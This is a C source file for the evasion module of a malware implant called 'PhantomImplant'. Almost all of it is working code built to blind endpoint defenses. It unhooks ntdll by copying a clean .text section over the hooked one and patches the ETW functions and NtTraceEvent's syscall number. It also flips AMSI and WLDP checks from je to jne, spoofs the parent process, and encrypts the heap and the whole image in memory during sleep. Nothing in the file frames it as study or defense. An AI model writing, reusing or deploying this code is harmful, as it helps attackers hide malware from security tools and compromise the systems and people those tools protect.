/**
 * PhantomImplant - EDR Evasion Module
 *
 * Three core techniques:
 *   1. NTDLL Unhooking  - Map clean ntdll from disk, overwrite hooked .text section
 *   2. ETW Bypass       - Patch EtwEventWrite/Full + NtTraceEvent SSN
 *   3. AMSI Bypass      - Patch AmsiOpenSession + AmsiScanBuffer (je -> jne)
 *
 * Based on: standard Windows evasion techniques
 */

#include "evasion.h"
#include "api.h"
#include <bcrypt.h>
#include <tlhelp32.h>
#include <stdio.h>

// =============================================
// Opcodes
// =============================================
#define x64_RET_OPCODE      0xC3
#define x64_INT3_OPCODE     0xCC
#define x64_JE_OPCODE       0x74
#define x64_JNE_OPCODE      0x75
#define x64_MOV_OPCODE      0xB8
#define x64_SYSCALL_SIZE    0x20

// =============================================
// 1. NTDLL UNHOOKING (from disk via mapped file)
// =============================================

// Get local ntdll base from PEB (second module in load order)
static PVOID FetchLocalNtdllBase(VOID) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);
    return pLdr->DllBase;
}

// Map clean ntdll from disk using SEC_IMAGE_NO_EXECUTE (no kernel callback)
static BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {
    HANDLE hFile = NULL, hSection = NULL;
    CHAR cWinPath[MAX_PATH / 2] = { 0 };
    CHAR cNtdllPath[MAX_PATH] = { 0 };
    PBYTE pBuf = NULL;

    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0)
        goto _Fail;

    sprintf(cNtdllPath, "%s\\System32\\NTDLL.DLL", cWinPath);

    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto _Fail;

    // SEC_IMAGE_NO_EXECUTE: maps as image but doesn't trigger PsSetLoadImageNotifyRoutine
    hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (!hSection)
        goto _Fail;

    pBuf = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    if (!pBuf)
        goto _Fail;

    *ppNtdllBuf = pBuf;
    CloseHandle(hFile);
    CloseHandle(hSection);
    return TRUE;

_Fail:
    if (hFile && hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (hSection) CloseHandle(hSection);
    return FALSE;
}

// Replace hooked .text section with clean one
static BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
    PVOID pLocalNtdll = FetchLocalNtdllBase();

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PVOID  pLocalTxt  = NULL;
    PVOID  pCleanTxt  = NULL;
    SIZE_T sTxtSize   = 0;

    PIMAGE_SECTION_HEADER pSecHdr = IMAGE_FIRST_SECTION(pNtHdrs);
    for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSecHdr[i].Name | 0x20202020) == 'xet.') {
            pLocalTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSecHdr[i].VirtualAddress);
            pCleanTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSecHdr[i].VirtualAddress);
            sTxtSize  = pSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pLocalTxt || !pCleanTxt || !sTxtSize)
        return FALSE;

    DWORD dwOld = 0;
    if (!VirtualProtect(pLocalTxt, sTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOld))
        return FALSE;

    memcpy(pLocalTxt, pCleanTxt, sTxtSize);

    if (!VirtualProtect(pLocalTxt, sTxtSize, dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

BOOL UnhookNtdll(VOID) {
    PVOID pCleanNtdll = NULL;

    if (!MapNtdllFromDisk(&pCleanNtdll))
        return FALSE;

    BOOL bResult = ReplaceNtdllTxtSection(pCleanNtdll);
    UnmapViewOfFile(pCleanNtdll);
    return bResult;
}

// =============================================
// 2. ETW BYPASS
// =============================================

// Patch EtwEventWrite or EtwEventWriteFull with xor eax,eax; ret
static BOOL PatchEtwFunc(LPCSTR szFuncName) {
    PBYTE pFunc = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), szFuncName);
    if (!pFunc) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 }; // xor eax, eax; ret
    DWORD dwOld = 0;

    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &dwOld))
        return FALSE;

    memcpy(pFunc, patch, sizeof(patch));

    if (!VirtualProtect(pFunc, sizeof(patch), dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

// Patch NtTraceEvent SSN with dummy value
static BOOL PatchNtTraceEventSSN(VOID) {
    PBYTE pFunc = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
    if (!pFunc) return FALSE;

    PBYTE pSSN = NULL;
    for (int i = 0; i < x64_SYSCALL_SIZE; i++) {
        if (pFunc[i] == x64_MOV_OPCODE) {
            pSSN = &pFunc[i + 1];
            break;
        }
        if (pFunc[i] == x64_RET_OPCODE || pFunc[i] == 0x0F)
            return FALSE;
    }
    if (!pSSN) return FALSE;

    DWORD dwOld = 0;
    if (!VirtualProtect(pSSN, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOld))
        return FALSE;

    *(PDWORD)pSSN = 0x000000FF; // Dummy SSN → STATUS_INVALID_PARAMETER

    if (!VirtualProtect(pSSN, sizeof(DWORD), dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

BOOL PatchEtw(VOID) {
    BOOL b1 = PatchEtwFunc("EtwEventWrite");
    BOOL b2 = PatchEtwFunc("EtwEventWriteFull");
    BOOL b3 = PatchNtTraceEventSSN();
    return b1 || b2 || b3; // Success if at least one patch worked
}

// =============================================
// 3. AMSI BYPASS
// =============================================

// Verify a je instruction actually jumps to mov eax, E_INVALIDARG
static BOOL VerifyJeTarget(PBYTE pAddr) {
    if (*pAddr != x64_JE_OPCODE) return FALSE;
    BYTE bOffset = *(pAddr + 1);
    PBYTE pTarget = pAddr + 2 + bOffset;
    return *pTarget == x64_MOV_OPCODE;
}

// Generic: find last ret, search upward for verified je, patch to jne
static BOOL PatchFuncJeToJne(PBYTE pFunc) {
    if (!pFunc) return FALSE;

    DWORD i = 0;
    // Find last ret (followed by int3 int3)
    while (1) {
        if (pFunc[i] == x64_RET_OPCODE && pFunc[i + 1] == x64_INT3_OPCODE && pFunc[i + 2] == x64_INT3_OPCODE)
            break;
        i++;
        if (i > 0x1000) return FALSE; // Safety limit
    }

    // Search upward for verified je instruction
    PBYTE pTarget = NULL;
    while (i) {
        if (VerifyJeTarget(&pFunc[i])) {
            pTarget = &pFunc[i];
            break;
        }
        i--;
    }
    if (!pTarget) return FALSE;

    // Patch je (0x74) → jne (0x75)
    DWORD dwOld = 0;
    if (!VirtualProtect(pTarget, 1, PAGE_EXECUTE_READWRITE, &dwOld))
        return FALSE;
    *pTarget = x64_JNE_OPCODE;
    if (!VirtualProtect(pTarget, 1, dwOld, &dwOld))
        return FALSE;

    return TRUE;
}

BOOL PatchAmsi(VOID) {
    // amsi.dll may not be loaded yet — load it
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE; // No AMSI = nothing to patch (success)

    BOOL b1 = PatchFuncJeToJne((PBYTE)GetProcAddress(hAmsi, "AmsiOpenSession"));
    BOOL b2 = PatchFuncJeToJne((PBYTE)GetProcAddress(hAmsi, "AmsiScanBuffer"));

    // WldpQueryDynamicCodeTrust (optional, in wldp.dll)
    HMODULE hWldp = LoadLibraryA("wldp.dll");
    BOOL b3 = FALSE;
    if (hWldp)
        b3 = PatchFuncJeToJne((PBYTE)GetProcAddress(hWldp, "WldpQueryDynamicCodeTrust"));

    return b1 || b2;
}

// =============================================
// Run all evasion techniques
// =============================================
BOOL RunAllEvasion(VOID) {
    BOOL bNtdll = UnhookNtdll();
    BOOL bEtw   = PatchEtw();
    BOOL bAmsi  = PatchAmsi();
    return bNtdll && bEtw && bAmsi;
}

// =============================================
// 4. PPID SPOOFING
// Open explorer.exe with PROCESS_CREATE_PROCESS so it can be used
// as the spoofed parent in STARTUPINFOEXA attribute lists.
// =============================================
HANDLE GetSpoofParentHandle(VOID) {
    HANDLE hParent = NULL;
    PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return NULL;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return hParent;
}

// =============================================
// 5. SLEEP MASKING (Heap Encryption)
// XOR-encrypt all live blocks on the implant's private heap before sleeping.
// Using a private heap (not GetProcessHeap) avoids corrupting CRT internals.
// Call ImplantHeapInit() once at startup, then use ImplantAlloc/ImplantFree
// for all implant allocations that should be masked during sleep.
// =============================================

static HANDLE g_hImplantHeap = NULL;

BOOL ImplantHeapInit(VOID) {
    g_hImplantHeap = HeapCreate(0, 0, 0);
    return (g_hImplantHeap != NULL);
}

PVOID ImplantAlloc(SIZE_T size) {
    if (!g_hImplantHeap) return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    return HeapAlloc(g_hImplantHeap, HEAP_ZERO_MEMORY, size);
}

VOID ImplantFree(PVOID ptr) {
    if (!g_hImplantHeap || !ptr) return;
    HeapFree(g_hImplantHeap, 0, ptr);
}

VOID MaskedSleep(DWORD dwMs) {
    BYTE bKey = 0;
    BCryptGenRandom(NULL, &bKey, 1, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (bKey == 0) bKey = 0xAB; // ensure non-zero key

    HANDLE hHeap = g_hImplantHeap ? g_hImplantHeap : GetProcessHeap();
    PROCESS_HEAP_ENTRY he = { 0 };

    HeapLock(hHeap);
    while (HeapWalk(hHeap, &he)) {
        if ((he.wFlags & PROCESS_HEAP_ENTRY_BUSY) && he.cbData > 0) {
            PBYTE p = (PBYTE)he.lpData;
            for (SIZE_T i = 0; i < he.cbData; i++)
                p[i] ^= bKey;
        }
    }
    HeapUnlock(hHeap);

    FoliageSleep(dwMs);

    ZeroMemory(&he, sizeof(he));
    HeapLock(hHeap);
    while (HeapWalk(hHeap, &he)) {
        if ((he.wFlags & PROCESS_HEAP_ENTRY_BUSY) && he.cbData > 0) {
            PBYTE p = (PBYTE)he.lpData;
            for (SIZE_T i = 0; i < he.cbData; i++)
                p[i] ^= bKey;
        }
    }
    HeapUnlock(hHeap);
}

// =============================================
// 6. FOLIAGE SLEEP OBFUSCATION
// Encrypts the entire implant image with RC4 (SystemFunction032) and delays
// execution via an APC chain, so the payload is concealed in memory during
// sleep. The obfuscation chain runs in a separate thread and terminates it.
// =============================================

typedef VOID (NTAPI* FOLIAGE_APC_ROUTINE)(PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI* FOLIAGE_NTCREATEEVENT)(PHANDLE, ACCESS_MASK, PVOID, ULONG, BOOLEAN);
typedef NTSTATUS (NTAPI* FOLIAGE_NTCREATETHREADEX)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI* FOLIAGE_NTGETCONTEXT)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI* FOLIAGE_NTWAIT)(HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI* FOLIAGE_NTSIGNALWAIT)(HANDLE, HANDLE, BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI* FOLIAGE_NTQUEUEAPC)(HANDLE, FOLIAGE_APC_ROUTINE, PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI* FOLIAGE_NTALERTRESUME)(HANDLE, PULONG);

typedef struct _FOLIAGE_API {
    FOLIAGE_NTCREATEEVENT     NtCreateEvent;
    FOLIAGE_NTCREATETHREADEX  NtCreateThreadEx;
    FOLIAGE_NTGETCONTEXT      NtGetContextThread;
    FOLIAGE_NTWAIT            NtWaitForSingleObject;
    FOLIAGE_NTSIGNALWAIT      NtSignalAndWaitForSingleObject;
    FOLIAGE_NTQUEUEAPC       NtQueueApcThread;
    FOLIAGE_NTALERTRESUME     NtAlertResumeThread;
    PVOID                     NtContinue;
    PVOID                     NtTestAlert;
    PVOID                     SystemFunction032;
} FOLIAGE_API, *PFOLIAGE_API;

static BOOL FoliageInitApi(PFOLIAGE_API pApi) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll)
        return FALSE;

    pApi->NtCreateEvent                = (FOLIAGE_NTCREATEEVENT)GetProcAddress(hNtdll, "NtCreateEvent");
    pApi->NtCreateThreadEx             = (FOLIAGE_NTCREATETHREADEX)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pApi->NtGetContextThread           = (FOLIAGE_NTGETCONTEXT)GetProcAddress(hNtdll, "NtGetContextThread");
    pApi->NtWaitForSingleObject        = (FOLIAGE_NTWAIT)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    pApi->NtSignalAndWaitForSingleObject = (FOLIAGE_NTSIGNALWAIT)GetProcAddress(hNtdll, "NtSignalAndWaitForSingleObject");
    pApi->NtQueueApcThread             = (FOLIAGE_NTQUEUEAPC)GetProcAddress(hNtdll, "NtQueueApcThread");
    pApi->NtAlertResumeThread          = (FOLIAGE_NTALERTRESUME)GetProcAddress(hNtdll, "NtAlertResumeThread");
    pApi->NtContinue                   = GetProcAddress(hNtdll, "NtContinue");
    pApi->NtTestAlert                  = GetProcAddress(hNtdll, "NtTestAlert");
    pApi->SystemFunction032            = GetProcAddress(LoadLibraryA("Advapi32.dll"), "SystemFunction032");

    return TRUE;
}

// FoliageSleep obfuscates the whole image, sleeps via an APC chain, then
// deobfuscates. Falls back to plain Sleep() if the chain cannot be built.
VOID FoliageSleep(DWORD dwMs) {
    FOLIAGE_API api = { 0 };
    if (!FoliageInitApi(&api)) {
        Sleep(dwMs);
        return;
    }

    NTSTATUS st          = 0;
    STRING   Key         = { 0 };
    STRING   Img         = { 0 };
    BYTE     Rnd[16]     = { 0 };
    CONTEXT  Ctx[7]      = { 0 };
    CONTEXT  CtxInit     = { 0 };
    HANDLE   EvntSync    = NULL;
    HANDLE   Thread      = NULL;
    ULONG    Protect     = 0;

    BCryptGenRandom(NULL, Rnd, sizeof(Rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    PVOID ImageBase = GetModuleHandleA(NULL);
    ULONG ImageSize = ((PIMAGE_NT_HEADERS)((UINT_PTR)ImageBase +
        ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    Key.Buffer = (PCHAR)Rnd;    Key.Length = sizeof(Rnd);
    Img.Buffer = ImageBase;     Img.Length = ImageSize;

    // Synchronization event (SynchronizationEvent = 1)
    st = api.NtCreateEvent(&EvntSync, EVENT_ALL_ACCESS, NULL, 1, FALSE);
    if (st < 0) goto _out;

    // Suspended thread (CreateFlags = 1 = suspended)
    st = api.NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
                              NULL, NULL, 1, 0, 0x1000 * 20, 0x1000 * 20, NULL);
    if (st < 0) goto _out;

    CtxInit.ContextFlags = CONTEXT_FULL;
    st = api.NtGetContextThread(Thread, &CtxInit);
    if (st < 0) goto _out;

    // Return address after each APC = NtTestAlert (executes the next queued APC).
    *(PVOID*)CtxInit.Rsp = api.NtTestAlert;

    for (int i = 0; i < 7; i++)
        memcpy(&Ctx[i], &CtxInit, sizeof(CONTEXT));

    // Ctx[0] — wait for the start signal
    Ctx[0].Rip = (UINT_PTR)api.NtWaitForSingleObject;
    Ctx[0].Rcx = (UINT_PTR)EvntSync;
    Ctx[0].Rdx = FALSE;
    Ctx[0].R8  = 0;

    // Ctx[1] — make image writable
    Ctx[1].Rip = (UINT_PTR)VirtualProtect;
    Ctx[1].Rcx = (UINT_PTR)ImageBase;
    Ctx[1].Rdx = ImageSize;
    Ctx[1].R8  = PAGE_READWRITE;
    Ctx[1].R9  = (UINT_PTR)&Protect;

    // Ctx[2] — encrypt image (RC4)
    Ctx[2].Rip = (UINT_PTR)api.SystemFunction032;
    Ctx[2].Rcx = (UINT_PTR)&Img;
    Ctx[2].Rdx = (UINT_PTR)&Key;

    // Ctx[3] — delay (sleep)
    Ctx[3].Rip = (UINT_PTR)WaitForSingleObjectEx;
    Ctx[3].Rcx = (UINT_PTR)GetCurrentProcess();
    Ctx[3].Rdx = dwMs;
    Ctx[3].R8  = FALSE;

    // Ctx[4] — decrypt image
    Ctx[4].Rip = (UINT_PTR)api.SystemFunction032;
    Ctx[4].Rcx = (UINT_PTR)&Img;
    Ctx[4].Rdx = (UINT_PTR)&Key;

    // Ctx[5] — make image executable again
    Ctx[5].Rip = (UINT_PTR)VirtualProtect;
    Ctx[5].Rcx = (UINT_PTR)ImageBase;
    Ctx[5].Rdx = ImageSize;
    Ctx[5].R8  = PAGE_EXECUTE_READ;
    Ctx[5].R9  = (UINT_PTR)&Protect;

    // Ctx[6] — exit the chain thread
    Ctx[6].Rip = (UINT_PTR)ExitThread;
    Ctx[6].Rcx = 0;

    // Queue the APC chain (NtContinue executes each context).
    for (int i = 0; i < 7; i++) {
        st = api.NtQueueApcThread(Thread, (FOLIAGE_APC_ROUTINE)api.NtContinue, &Ctx[i], 0, 0);
        if (st < 0) goto _out;
    }

    // Resume the thread and trigger the chain; wait for it to finish.
    api.NtAlertResumeThread(Thread, NULL);
    api.NtSignalAndWaitForSingleObject(EvntSync, Thread, TRUE, NULL);

_out:
    if (Thread)    CloseHandle(Thread);
    if (EvntSync)  CloseHandle(EvntSync);
}
